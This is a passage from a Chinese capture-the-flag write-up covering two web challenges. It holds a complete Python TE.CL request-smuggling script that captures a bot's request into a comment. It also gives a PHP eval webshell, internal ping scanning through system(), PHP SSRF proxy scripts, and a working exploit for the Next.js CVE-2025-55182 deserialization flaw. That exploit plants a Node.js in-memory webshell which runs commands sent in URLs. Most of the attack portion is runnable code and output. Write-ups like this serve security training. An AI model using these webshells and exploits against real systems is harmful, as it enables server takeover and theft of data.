        None => (raw_uri, "")

    };

  

    let mut queries: HashMap<String, String> = HashMap::new();

  

    if !raw_query.is_empty() {

        for query in raw_query.split("&") {

            if query.is_empty() { continue; }

  

            let (k, v) = match query.split_once("=") {

                Some((k, v)) => (k, v),

                None => (query, "")

            };

  

            if !k.is_empty() {

                queries

        .insert(k.to_string(), v.to_string());

            }

        }

    }

    (path.to_string(), queries)

}
```
通过分析源码可以知道，
有一句
```rust
    let body_length: usize = headers
        .get("content-length")
        .and_then(|v| v.parse().ok())
        .unwrap_or(0);
```
可以看到后端只使用`Content-Length`，不处理`Transfer-Encoding`
所以就是TE.CL攻击。
利用脚本
```python
import requests  
import socket  
import time  
import string  
import random  
import urllib.parse  
# 修复：TARGET_HOST 只保留域名，去掉http://  
TARGET_HOST = "forward.vidar.club"  
TARGET_PORT = 32160  
# 修复：正确拼接BASE_URL  
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"  
POISON_CONTENT_LENGTH = 350  
  
  
def random_string(length=8):  
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))  
  
  
def main():  
    session = requests.Session()  
    username = f"hacker_{random_string(4)}"  
    password = random_string(8)  
  
    # 注册账号  
    reg_resp = session.post(f"{BASE_URL}/api/register", json={  
        "username": username,  
        "password": password  
    })  
    if reg_resp.status_code != 200 or 'token' not in reg_resp.json():  
        print("[-] 注册失败:", reg_resp.text)  
        return  
    token = reg_resp.json()['token']  
    print(f"[+] 注册成功，用户名: {username}，token: {token[:10]}...")  
  
    # 构造走私请求  
    smuggled_req = (  
        f"POST /api/comment HTTP/1.1\r\n"  
        f"Content-Type: application/x-www-form-urlencoded\r\n"  
        f"Authorization: {token}\r\n"  
        f"Content-Length: {POISON_CONTENT_LENGTH}\r\n"  
        f"\r\n"  
        f"content="    )  
    chunk_size_hex = hex(len(smuggled_req))[2:]  
    payload = (  
        f"POST /api/login HTTP/1.1\r\n"  
        f"Host: {TARGET_HOST}\r\n"  
        f"Content-Type: application/x-www-form-urlencoded\r\n"  
        f"Transfer-Encoding: chunked\r\n"  
        f"\r\n"  
        f"{chunk_size_hex}\r\n"  
        f"{smuggled_req}\r\n"  
        f"0\r\n"  
        f"\r\n"  
    )  
    print(f"[+] 构造的payload长度: {len(payload)}")  
    print(payload.encode())  # 打印 bytes 形式，确保 \r\n 没问题  
  
    s = None  # 初始化socket变量，避免finally中报错  
    try:  
        # 修复：socket连接目标是域名，不是带http的地址  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        s.settimeout(5.0)  
        s.connect((TARGET_HOST, TARGET_PORT))  
        s.sendall(payload.encode())  
  
        # 修复：接收socket响应（关键！）  
        resp = s.recv(4096)  # 接收4096字节的响应  
        if b"401" in resp or b"400" in resp:  
            print("[+] 成功收到前置请求的响应！TCP 连接目前应该处于挂起状态。")  
        else:  
            print(f"[-] 警告: 收到的响应不符合预期，走私可能失败。响应内容: {resp[:200]}")  
    except Exception as e:  
        print("[-] Socket 异常:", e)  
        return  
  
    # 等待Bot处理请求  
    print("[+] 等待25秒，让Bot填充数据...")  
    time.sleep(25)  
  
    # 查询评论获取数据  
    headers = {"Authorization": token}  
    try:  
        comments_resp = session.get(f"{BASE_URL}/api/comment", headers=headers)  
        if comments_resp.status_code == 200:  
            comments = comments_resp.json()  
            hacker_comments = [c for c in comments if c.get('username') == username]  
            if hacker_comments:  
                # URL解码获取数据  
                raw_stolen = hacker_comments[-1]['content']  
                decoded_stolen = urllib.parse.unquote(raw_stolen)  
                print("[+] 获取到的数据:")  
                print(decoded_stolen)  
                print("=" * 60)  
            else:  
                print("[-] 未找到当前用户的评论，走私可能未成功")  
        else:  
            print(f"[-] 获取评论失败，状态码: {comments_resp.status_code}")  
    except Exception as e:  
        print(f"[-] 请求评论出错: {e}")  
    finally:  
        # 修复：判断socket是否存在再关闭  
        if s:  
            s.close()  
            print("[+] Socket已关闭")  
  
  
if __name__ == "__main__":  
    main()
```
得到flag
也可以手动发送
![](image/355.png)
多试几次，其中b2是下面的十六进制长度。
## baby-web?
外层是一个PHP文件上传站点，内层隐藏了一个Next.js应用
附件文件
```php
<?php
$target_dir = "uploads/";
if (!file_exists($target_dir)) mkdir($target_dir, 0777, true);

$uploadOk = 1;
$message = "";
$type = "error";

if(isset($_POST["submit"])) {
    $origName = $_FILES['fileToUpload']['name'];
    $target_file = $target_dir . $origName;

    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_file)) {
        $message = "文件已上传，保存名：" . $origName;
        $type = "success";
    } else {
        $message = "抱歉，上传你的文件时出现了错误。";
    }

    if ($_FILES["fileToUpload"]["size"] > 10000000) {
        $message = "抱歉，你的文件太大了。";
        $uploadOk = 0;
    }
    $fileExt = strtolower(pathinfo($_FILES["fileToUpload"]["name"], PATHINFO_EXTENSION));
    $allowedTypes = ["jpg", "jpeg", "png", "gif", "pdf", "doc", "docx", "txt","htaccess","php"];
    if(!in_array($fileExt, $allowedTypes)) {
        $message = "抱歉，只允许上传 JPG, JPEG, PNG, GIF, PDF, DOC, DOCX & TXT 格式的文件。";
        $uploadOk = 0;
    }

    if ($uploadOk != 1)
    {
        if (file_exists($target_file))
            @unlink($target_file);
        $message .= " 你的文件没有被上传。";
    }
    header("Location: l0cked_myst3ry.php?message=" . urlencode($message) . "&type=" . urlencode($type));
    exit();
}
?>
```
可以发现白名单
```php
$allowedTypes = ["jpg", "jpeg", "png", "gif", "pdf", "doc", "docx", "txt","htaccess","php"];
```
可以上传php，那就直接木马传上去，
```php
<?php
@eval($_POST['cmd']);
phpinfo();
?>
```
可以直接拿到shell。
但是没有找到flag。
接下来探索内网。
先
```
cmd=system('cat /etc/hosts');
```
得到
```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
10.0.0.1	d7bd4c857a33
```
可以得到`10.0.0`网段有服务存在
可以简单内网扫描一下
```
cmd=system('for i in 2 3 4 5; do ping -c1 10.0.0.$i; done');
```
这样可以得到
```
PING 10.0.0.2 (10.0.0.2): 56 data bytes 64 bytes from 10.0.0.2: seq=0 ttl=42 time=5.375 ms --- 10.0.0.2 ping statistics --- 1 packets transmitted, 1 packets received, 0% packet loss round-trip min/avg/max = 5.375/5.375/5.375 ms PING 10.0.0.3 (10.0.0.3): 56 data bytes --- 10.0.0.3 ping statistics --- 1 packets transmitted, 0 packets received, 100% packet loss PING 10.0.0.4 (10.0.0.4): 56 data bytes --- 10.0.0.4 ping statistics --- 1 packets transmitted, 0 packets received, 100% packet loss PING 10.0.0.5 (10.0.0.5): 56 data bytes --- 10.0.0.5 ping statistics --- 1 packets transmitted, 0 packets received, 100% packet loss
```
可以看到除了`10.0.0.2`其他丢包率都为100%，所以`10.0.0.2`是存活的，又因为node.js服务一般都在3000端口，
所以- 内网存在 `10.0.0.2:3000` 运行 Next.js 服务
由于无法从外部直接访问内网服务，上传了一个PHP代理脚本，利用PHP的curl扩展作为SSRF跳板访问内网Next.js服务。
脚本为
```php
<?php
$url = $_GET['url'];
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
echo curl_exec($ch);
curl_close($ch);
?>
```
上传后访问
```
http://forward.vidar.club:31927/uploads/proxy.php?url=http://10.0.0.2:3000
```
那里的3000端口和ip地址都可以这样扫描出来
这样可以看到一句话
```
# Hello

Congratulations! The flag is located at: `/flag`
```

接下来就用next.js，CVE-2025-55182
先在上传一个文件9.php，这是一个php代理脚本，在外部攻击者和内网服务之间建立联系，实现了对指定内网服务器的反向代理
```php
<?php
// 1. 接收你想访问的内网路径，默认访问根目录
$path = isset($_GET['path']) ? $_GET['path'] : '/';
$url = "http://10.0.0.2:3000" . $path;

// 2. 初始化 cURL，准备向内网发包
$ch = curl_init($url);
$method = $_SERVER['REQUEST_METHOD']; //获取外部请求的方法（比如 GET、POST、PUT 等）。
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);

// 3. 【关键点】转发 Content-Type 请求头
// 漏洞利用强依赖 Content-Type 中的 boundary 参数，必须透传
$headers = array();
$contentType = isset($_SERVER["CONTENT_TYPE"]) ? $_SERVER["CONTENT_TYPE"] : '';//获取外部的Content-Type头
if ($contentType) {
    $headers[] = "Content-Type: " . $contentType;
}
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);//将得到的Conten-Type头设置到cURL请求中

// 4. 【关键点】转发原始 POST 实体
if ($method === 'POST') {
    // 千万不要用 $_POST！ $_POST是 PHP 解析后的 POST 数据（仅能解析`application/x-www-form-urlencoded`或`multipart/form-data`类型），会丢失原始格式；
    // php://input 可以读取到最原始的、未经 PHP 解析的 HTTP Body 数据
    $body = file_get_contents('php://input');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $body);//将原始POST数据设置到cURL请求中
}

// 5. 获取响应并返回给攻击者（你的电脑）
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);//表示 cURL 执行后返回响应内容（而不是直接输出），方便赋值给变量。
curl_setopt($ch, CURLOPT_HEADER, false);//只获取响应体，忽略响应头

$response = curl_exec($ch);//执行cURL请求，向内网服务发送请求并获取响应
echo $response;

curl_close($ch);//关闭cURL会话
?>
```
再上传一个exploit_proxy.php
```php
<?php
// 专门用于打 Next.js 的代理
$url = "http://10.0.0.2:3000/";
$ch = curl_init($url);

// 强行指定 POST 方法
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');

// 【核心魔法】在这里硬编码 Next.js 需要的漏洞触发头
// 这样就完美避开了 PHP 对 multipart 的拦截
$headers = array(
    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCVE202555182",
    "Next-Action: exploit_cve_2025_55182"
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// 因为 Python 传来的是纯文本，php://input 里完好无损地保存着我们的 Payload
$body = file_get_contents('php://input');
curl_setopt($ch, CURLOPT_POSTFIELDS, $body); //将原始 Payload 设置为 POST 请求体，发送给内网 Next.js 服务，触发漏洞。

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
echo curl_exec($ch);
curl_close($ch);
?>
```
接下来就执行脚本
```python
import requests  
import urllib.parse  
import time  
  
# 代理地址  
exploit_proxy_url = "http://forward.vidar.club:31725/uploads/exploit_proxy.php"  
normal_proxy_url = "http://forward.vidar.club:31725/uploads/9.php"  
  
boundary = "----WebKitFormBoundaryCVE202555182"  
  
# ================= 第五步：注入内存 Webshell =================# 真正的内存马：兼容 Function 作用域，挂载底层 http 拦截器  
memory_webshell_js = "try{var rq=typeof process!=='undefined'&&process.mainModule?process.mainModule.require:require;var h=rq('http');var cp=rq('child_process');if(!h.Server.prototype.__hk){var o=h.Server.prototype.emit;h.Server.prototype.emit=function(e,req,res){if(e==='request'&&req.url.indexOf('cmd=')!==-1){try{var c=decodeURIComponent(req.url.split('cmd=')[1].split('&')[0]);res.writeHead(200);res.end(cp.execSync(c).toString());}catch(err){res.writeHead(500);res.end(err.message);}return;}return o.apply(this,arguments);};h.Server.prototype.__hk=true;}}catch(ex){}//"  
# 在 Node.js 的 HTTP 服务中挂载一个**请求拦截器**，当收到包含`cmd=`的 URL 请求时，执行系统命令并返回结果。
  
chunk_0 = f'{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":"{memory_webshell_js}","_formData":{{"get":"$1:constructor:constructor"}}}}}}'  
  
raw_body = (  
    f"--{boundary}\r\n"  
    f'Content-Disposition: form-data; name="0"\r\n\r\n'  
    f'{chunk_0}\r\n'  
    f"--{boundary}\r\n"  
    f'Content-Disposition: form-data; name="1"\r\n\r\n'  
    f'"$@0"\r\n'  
    f"--{boundary}--\r\n"  
)  
  
print("[*] 第五步：正在利用真实 React2Shell PoC 注入内存马...")  
try:  
    # 依然使用纯文本伪装，防 PHP 吃掉 multipart    requests.post(  
        exploit_proxy_url,  
        headers={"Content-Type": "text/plain"},  
        data=raw_body.encode('utf-8')  
    )  
    print("[+] 注入指令已发送！")  
except Exception as e:  
    print("[-] 网络请求异常:", e)  
  
# 给 Node.js 一点时间处理反序列化并挂载钩子  
time.sleep(2)  
  
# ================= 第六步：读取 Flag =================print("\n[*] 第六步：利用被动内存马读取 Flag...")  
  
# 对路径和命令进行双重 URL 编码，确保安全穿透 PHP 代理到达内网  
cmd = urllib.parse.quote("cat /flag")  
path = urllib.parse.quote(f"/?cmd={cmd}")  
  
target_url = f"{normal_proxy_url}?path={path}"  
  
try:  
    res = requests.get(target_url)  
    print("\n================ 🏆 FLAG ================")  
    if res.status_code == 200 and "flag{" in res.text:  
        print(res.text.strip())  
    elif "flag{" in res.text:  
        print(res.text.strip())  
    else:  
        print("未直接看到 Flag，返回内容：\n", res.text[:500])  
    print("==========================================")  
except Exception as e:  
    print("[-] 获取 Flag 失败:", e)
```
这样就读取到了flag   flag{TArg3t_In_f4k3-TArg3T-XiX12df282771}